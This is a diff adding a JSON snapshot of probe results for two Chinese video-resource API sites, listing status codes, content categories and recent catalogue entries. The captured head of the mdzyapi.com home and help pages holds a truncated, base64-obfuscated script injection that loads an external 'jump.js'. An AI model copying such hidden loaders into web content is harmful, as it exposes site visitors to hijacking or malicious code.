@@ -1,0 +1,641 @@
+[
+  {
+    "key": "mdzy-home",
+    "url": "https://mdzyapi.com/",
+    "final_url": "https://mdzyapi.com/",
+    "status": 200,
+    "bytes": 25039,
+    "content_type": "text/html; charset=utf-8",
+    "text_start": "<!DOCTYPE html>\n<html lang=\"zh-cn\">\n<head><script>(function(){var s=document.createElement('script');s.src=atob('aHR0cHM6Ly9qcy5vbmVvbnN0YWNrLmNvbS9qdW1wLmpz');"
+  },
+  {
+    "key": "mdzy-list",
+    "url": "https://www.mdzyapi.com/api.php/provide/vod/?ac=list",
+    "final_url": "https://www.mdzyapi.com/api.php/provide/vod/?ac=list",
+    "status": 200,
+    "bytes": 6535,
+    "content_type": "text/html;charset=utf-8",
+    "code": 1,
+    "keys": [
+      "code",
+      "msg",
+      "page",
+      "pagecount",
+      "limit",
+      "total",
+      "list",
+      "class"
+    ],
+    "total": 91171,
+    "classes": [
+      {
+        "type_id": 1,
+        "type_pid": 0,
+        "type_name": "国产动漫"
+      },
+      {
+        "type_id": 2,
+        "type_pid": 0,
+        "type_name": "日韩动漫"
+      },
+      {
+        "type_id": 3,
+        "type_pid": 0,
+        "type_name": "欧美动漫"
+      },
+      {
+        "type_id": 4,
+        "type_pid": 0,
+        "type_name": "港台动漫"
+      },
+      {
+        "type_id": 5,
+        "type_pid": 0,
+        "type_name": "动漫电影"
+      },
+      {
+        "type_id": 6,
+        "type_pid": 0,
+        "type_name": "里番动漫"
+      },
+      {
+        "type_id": 7,
+        "type_pid": 0,
+        "type_name": "电影"
+      },
+      {
+        "type_id": 8,
+        "type_pid": 0,
+        "type_name": "连续剧"
+      },
+      {
+        "type_id": 9,
+        "type_pid": 0,
+        "type_name": "综艺"
+      },
+      {
+        "type_id": 10,
+        "type_pid": 7,
+        "type_name": "动作片"
+      },
+      {
+        "type_id": 11,
+        "type_pid": 7,
+        "type_name": "喜剧片"
+      },
+      {
+        "type_id": 12,
+        "type_pid": 7,
+        "type_name": "爱情片"
+      },
+      {
+        "type_id": 13,
+        "type_pid": 7,
+        "type_name": "科幻片"
+      },
+      {
+        "type_id": 14,
+        "type_pid": 7,
+        "type_name": "恐怖片"
+      },
+      {
+        "type_id": 15,
+        "type_pid": 7,
+        "type_name": "剧情片"
+      },
+      {
+        "type_id": 16,
+        "type_pid": 7,
+        "type_name": "战争片"
+      },
+      {
+        "type_id": 17,
+        "type_pid": 7,
+        "type_name": "惊悚片"
+      },
+      {
+        "type_id": 18,
+        "type_pid": 7,
+        "type_name": "家庭片"
+      },
+      {
+        "type_id": 19,
+        "type_pid": 7,
+        "type_name": "古装片"
+      },
+      {
+        "type_id": 20,
+        "type_pid": 7,
+        "type_name": "历史片"
+      },
+      {
+        "type_id": 21,
+        "type_pid": 7,
+        "type_name": "悬疑片"
+      },
+      {
+        "type_id": 22,
+        "type_pid": 7,
+        "type_name": "犯罪片"
+      },
+      {
+        "type_id": 23,
+        "type_pid": 7,
+        "type_name": "灾难片"
+      },
+      {
+        "type_id": 24,
+        "type_pid": 7,
+        "type_name": "记录片"
+      },
+      {
+        "type_id": 25,
+        "type_pid": 7,
+        "type_name": "短片"
+      },
+      {
+        "type_id": 26,
+        "type_pid": 8,
+        "type_name": "国产剧"
+      },
+      {
+        "type_id": 27,
+        "type_pid": 8,
+        "type_name": "香港剧"
+      },
+      {
+        "type_id": 28,
+        "type_pid": 8,
+        "type_name": "韩国剧"
+      },
+      {
+        "type_id": 29,
+        "type_pid": 8,
+        "type_name": "欧美剧"
+      },
+      {
+        "type_id": 30,
+        "type_pid": 8,
+        "type_name": "台湾剧"
+      },
+      {
+        "type_id": 31,
+        "type_pid": 8,
+        "type_name": "日本剧"
+      },
+      {
+        "type_id": 32,
+        "type_pid": 8,
+        "type_name": "海外剧"
+      },
+      {
+        "type_id": 33,
+        "type_pid": 8,
+        "type_name": "泰国剧"
+      },
+      {
+        "type_id": 34,
+        "type_pid": 9,
+        "type_name": "大陆综艺"
+      },
+      {
+        "type_id": 35,
+        "type_pid": 9,
+        "type_name": "港台综艺"
+      },
+      {
+        "type_id": 36,
+        "type_pid": 9,
+        "type_name": "日韩综艺"
+      },
+      {
+        "type_id": 37,
+        "type_pid": 9,
+        "type_name": "欧美综艺"
+      },
+      {
+        "type_id": 38,
+        "type_pid": 8,
+        "type_name": "短剧"
+      },
+      {
+        "type_id": 39,
+        "type_pid": 7,
+        "type_name": "伦理片"
+      },
+      {
+        "type_id": 40,
+        "type_pid": 0,
+        "type_name": "体育"
+      },
+      {
+        "type_id": 41,
+        "type_pid": 40,
+        "type_name": "足球"
+      },
+      {
+        "type_id": 42,
+        "type_pid": 0,
+        "type_name": "AI漫剧"
+      }
+    ],
+    "list_first": [
+      {
+        "vod_id": 87916,
+        "vod_name": "爱·回家之三代同糖粤语",
+        "type_id": 27,
+        "type_name": "香港剧",
+        "vod_remarks": "更新至60集",
+        "vod_time": "2026-11-02 20:22:47",
+        "vod_play_from": "modum3u8"
+      },
+      {
+        "vod_id": 91558,
+        "vod_name": "美食强人",
+        "type_id": 35,
+        "type_name": "港台综艺",
+        "vod_remarks": "更新至10集",
+        "vod_time": "2026-11-02 20:22:18",
+        "vod_play_from": "modum3u8"
+      },
+      {
+        "vod_id": 90995,
+        "vod_name": "伟大的长征",
+        "type_id": 26,
+        "type_name": "国产剧",
+        "vod_remarks": "更新至43集",
+        "vod_time": "2026-11-02 20:21:53",
+        "vod_play_from": "modum3u8"
+      },
+      {
+        "vod_id": 91680,
+        "vod_name": "尚公主",
+        "type_id": 26,
+        "type_name": "国产剧",
+        "vod_remarks": "更新至23集",
+        "vod_time": "2026-11-02 19:44:04",
+        "vod_play_from": "modum3u8"
+      },
+      {
+        "vod_id": 8692,
+        "vod_name": "吞噬星空",
+        "type_id": 1,
+        "type_name": "国产动漫",
+        "vod_remarks": "更新至248集",
+        "vod_time": "2026-11-02 19:21:14",
+        "vod_play_from": "modum3u8"
+      }
+    ]
+  },
+  {
+    "key": "mdzy-help",
+    "url": "https://mdzyapi.com/index.php/label/help.html",
+    "final_url": "https://mdzyapi.com/index.php/label/help.html",
+    "status": 200,
+    "bytes": 2665,
+    "content_type": "text/html; charset=utf-8",
+    "text_start": "<!DOCTYPE html>\n<html lang=\"en\">\n<head><script>(function(){var s=document.createElement('script');s.src=atob('aHR0cHM6Ly9qcy5vbmVvbnN0YWNrLmNvbS9qdW1wLmpz');doc"
+  },
+  {
+    "key": "360zy-home",
+    "url": "https://360zy.com/",
+    "final_url": "https://360zy.com/",
+    "status": 200,
+    "bytes": 44766,
+    "content_type": "text/html; charset=utf-8",
+    "text_start": "<!doctype html><html lang=\"zh-CN\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /><meta name=\"format-detection\" content=\"telephone=no"
+  },
+  {
+    "key": "360zy-list",
+    "url": "https://360zy.com/api.php/provide/vod/?ac=list",
+    "final_url": "https://360zy.com/api.php/provide/vod/?ac=list",
+    "status": 200,
+    "bytes": 6850,
+    "content_type": "text/html;charset=utf-8",
+    "code": 1,
+    "keys": [
+      "code",
+      "msg",
+      "page",
+      "pagecount",
+      "limit",
+      "total",
+      "list",
+      "class"
+    ],
+    "total": 74263,
+    "classes": [
+      {
+        "type_id": 1,
+        "type_pid": 0,
+        "type_name": "电影"
+      },
+      {
+        "type_id": 2,
+        "type_pid": 0,
+        "type_name": "连续剧"
+      },
+      {
+        "type_id": 3,
+        "type_pid": 0,
+        "type_name": "综艺"
+      },
+      {
+        "type_id": 4,
+        "type_pid": 0,
+        "type_name": "动漫"
+      },
+      {
+        "type_id": 5,
+        "type_pid": 0,
+        "type_name": "伦理片"
+      },
+      {
+        "type_id": 6,
+        "type_pid": 1,
+        "type_name": "动作片"
+      },
+      {
+        "type_id": 7,
+        "type_pid": 1,
+        "type_name": "喜剧片"
+      },
+      {
+        "type_id": 8,
+        "type_pid": 1,
+        "type_name": "爱情片"
+      },
+      {
+        "type_id": 9,
+        "type_pid": 1,
+        "type_name": "科幻片"
+      },
+      {
+        "type_id": 10,
+        "type_pid": 1,
+        "type_name": "恐怖片"
+      },
+      {
+        "type_id": 11,
+        "type_pid": 1,
+        "type_name": "剧情片"
+      },
+      {
+        "type_id": 12,
+        "type_pid": 1,
+        "type_name": "战争片"
+      },
+      {
+        "type_id": 13,
+        "type_pid": 2,
+        "type_name": "国产剧"
+      },
+      {
+        "type_id": 14,
+        "type_pid": 2,
+        "type_name": "香港剧"
+      },
+      {
+        "type_id": 15,
+        "type_pid": 2,
+        "type_name": "韩国剧"
+      },
+      {
+        "type_id": 16,
+        "type_pid": 2,
+        "type_name": "欧美剧"
+      },
+      {
+        "type_id": 17,
+        "type_pid": 0,
+        "type_name": "体育"
+      },
+      {
+        "type_id": 18,
+        "type_pid": 17,
+        "type_name": "NBA"
+      },
+      {
+        "type_id": 20,
+        "type_pid": 1,
+        "type_name": "惊悚片"
+      },
+      {
+        "type_id": 21,
+        "type_pid": 1,
+        "type_name": "家庭篇"
+      },
+      {
+        "type_id": 22,
+        "type_pid": 1,
+        "type_name": "古装片"
+      },
+      {
+        "type_id": 23,
+        "type_pid": 1,
+        "type_name": "历史片"
+      },
+      {
+        "type_id": 24,
+        "type_pid": 1,
+        "type_name": "悬疑片"
+      },
+      {
+        "type_id": 25,
+        "type_pid": 1,
+        "type_name": "犯罪片"
+      },
+      {
+        "type_id": 26,
+        "type_pid": 1,
+        "type_name": "灾难片"
+      },
+      {
+        "type_id": 27,
+        "type_pid": 1,
+        "type_name": "纪录片"
+      },
+      {
+        "type_id": 28,
+        "type_pid": 1,
+        "type_name": "短片"
+      },
+      {
+        "type_id": 29,
+        "type_pid": 1,
+        "type_name": "动画片"
+      },
+      {
+        "type_id": 30,
+        "type_pid": 2,
+        "type_name": "台湾剧"
+      },
+      {
+        "type_id": 31,
+        "type_pid": 2,
+        "type_name": "日本剧"
+      },
+      {
+        "type_id": 32,
+        "type_pid": 2,
+        "type_name": "海外剧"
+      },
+      {
+        "type_id": 33,
+        "type_pid": 2,
+        "type_name": "泰国剧"
+      },
+      {
+        "type_id": 34,
+        "type_pid": 3,
+        "type_name": "大陆综艺"
+      },
+      {
+        "type_id": 35,
+        "type_pid": 3,
+        "type_name": "港台综艺"
+      },
+      {
+        "type_id": 36,
+        "type_pid": 3,
+        "type_name": "日韩综艺"
+      },
+      {
+        "type_id": 37,
+        "type_pid": 3,
+        "type_name": "欧美综艺"
+      },
+      {
+        "type_id": 38,
+        "type_pid": 4,
+        "type_name": "国产动漫"
+      },
+      {
+        "type_id": 39,
+        "type_pid": 4,
+        "type_name": "欧美动漫"
+      },
+      {
+        "type_id": 40,
+        "type_pid": 4,
+        "type_name": "日韩动漫"
+      },
+      {
+        "type_id": 41,
+        "type_pid": 17,
+        "type_name": "足球"
+      },
+      {
+        "type_id": 42,
+        "type_pid": 17,
+        "type_name": "篮球"
+      },
+      {
+        "type_id": 43,
+        "type_pid": 1,
+        "type_name": "未分类"
+      },
+      {
+        "type_id": 45,
+        "type_pid": 1,
+        "type_name": "西部片"
+      },
+      {
+        "type_id": 46,
+        "type_pid": 0,
+        "type_name": "爽文短剧"
+      },
+      {
+        "type_id": 47,
+        "type_pid": 46,
+        "type_name": "现代都市"
+      },
+      {
+        "type_id": 48,
+        "type_pid": 46,
+        "type_name": "脑洞悬疑"
+      },
+      {
+        "type_id": 49,
+        "type_pid": 46,
+        "type_name": "年代穿越"
+      },
+      {
+        "type_id": 50,
+        "type_pid": 46,
+        "type_name": "古装仙侠"
+      },
+      {
+        "type_id": 51,
+        "type_pid": 46,
+        "type_name": "反转爽剧"
+      },
+      {
+        "type_id": 52,
+        "type_pid": 46,
+        "type_name": "女频恋爱"
+      },
+      {
+        "type_id": 53,
+        "type_pid": 46,
+        "type_name": "成长逆袭"
+      }
+    ],
+    "list_first": [
+      {
+        "vod_id": 108361,
+        "vod_name": "尚公主",
+        "type_id": 13,
+        "type_name": "国产剧",
+        "vod_remarks": "更新至23集",
+        "vod_time": "2026-11-02 19:36:29",
+        "vod_play_from": "360zy"
+      },
+      {
+        "vod_id": 58029,
+        "vod_name": "吞噬星空",
+        "type_id": 38,
+        "type_name": "国产动漫",
+        "vod_remarks": "更新至248集",
+        "vod_time": "2026-11-02 19:14:19",
+        "vod_play_from": "360zy"
+      },
+      {
+        "vod_id": 107106,
+        "vod_name": "寻踪者第四季",
+        "type_id": 16,
+        "type_name": "欧美剧",
+        "vod_remarks": "更新至05集",
+        "vod_time": "2026-11-02 18:47:22",
+        "vod_play_from": "360zy"
+      },
+      {
+        "vod_id": 107111,
+        "vod_name": "天狗的厨房第三季",
+        "type_id": 40,
+        "type_name": "日韩动漫",
+        "vod_remarks": "更新至05集",
+        "vod_time": "2026-11-02 18:37:52",
+        "vod_play_from": "360zy"
+      },
+      {
+        "vod_id": 107105,
+        "vod_name": "法警小队第二季",
+        "type_id": 16,
+        "type_name": "欧美剧",
+        "vod_remarks": "更新至05集",
+        "vod_time": "2026-11-02 18:37:35",
+        "vod_play_from": "360zy"
+      }
+    ]
+  },
+  {
+    "key": "360zy-help",
+    "url": "https://www.360zy.com/360zy/help.html",
+    "final_url": "https://www.360zy.com/360zy/help.html",
+    "status": 200,
+    "bytes": 30903,
+    "content_type": "text/html",
+    "text_start": "<!doctype html>\n<html lang=\"zh-CN\">\n\t<head>\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n\t\t<meta name=\"format-detection\" content=\"tel"
+  }
+]
